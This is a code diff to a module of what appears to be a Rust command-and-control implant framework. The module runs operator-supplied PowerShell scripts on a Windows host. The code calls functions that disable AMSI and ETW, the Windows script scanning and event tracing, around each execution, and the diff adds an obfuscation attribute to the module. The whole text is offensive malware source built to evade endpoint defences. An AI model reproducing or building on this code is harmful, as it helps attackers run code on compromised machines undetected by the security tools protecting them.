@@ -1,7 +1,7 @@
-use malefic_proto::proto::modulepb::BinaryResponse;
-use malefic_helper::win::kit::bypass::{bypass_amsi, bypass_etw, enable_amsi, enable_etw};
-use malefic_helper::win::kit::pwsh::pwsh_exec_command;
 use crate::prelude::*;
+use malefic_os_win::kit::bypass::{bypass_amsi, bypass_etw, enable_amsi, enable_etw};
+use malefic_os_win::kit::pwsh::pwsh_exec_command;
+use malefic_proto::proto::modulepb::BinaryResponse;
 pub struct ExecutePowershell {}
 
 #[async_trait]
@@ -9,19 +9,21 @@ pub struct ExecutePowershell {}
 impl Module for ExecutePowershell {}
 
 #[async_trait]
-impl malefic_proto::module::ModuleImpl for ExecutePowershell {
+#[obfuscate]
+impl malefic_module::ModuleImpl for ExecutePowershell {
     #[allow(unused_variables)]
     async fn run(
         &mut self,
         id: u32,
-        receiver: &mut malefic_proto::module::Input,
-        sender: &mut malefic_proto::module::Output,
+        receiver: &mut malefic_module::Input,
+        sender: &mut malefic_module::Output,
     ) -> ModuleResult {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
         let amsi_bypass = request.param.contains_key("bypass_amsi");
         let etw_bypass = request.param.contains_key("bypass_etw");
 
-        let script = String::from_utf8(request.bin).expect("Invalid UTF-8 sequence");
+        let script = String::from_utf8(request.bin)
+            .map_err(|e| anyhow::anyhow!("Invalid UTF-8 in powershell script: {}", e))?;
         let result: Vec<u8>;
         unsafe {
             if amsi_bypass {
@@ -39,12 +41,14 @@ impl malefic_proto::module::ModuleImpl for ExecutePowershell {
                 enable_etw();
             }
         }
-        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse{
-            status: 0,
-            message: Vec::new(),
-            data: result,
-            err: "".to_string(),
-        }))
-        )
+        Ok(TaskResult::new_with_body(
+            id,
+            Body::BinaryResponse(BinaryResponse {
+                status: 0,
+                message: Vec::new(),
+                data: result,
+                err: "".to_string(),
+            }),
+        ))
     }
 }
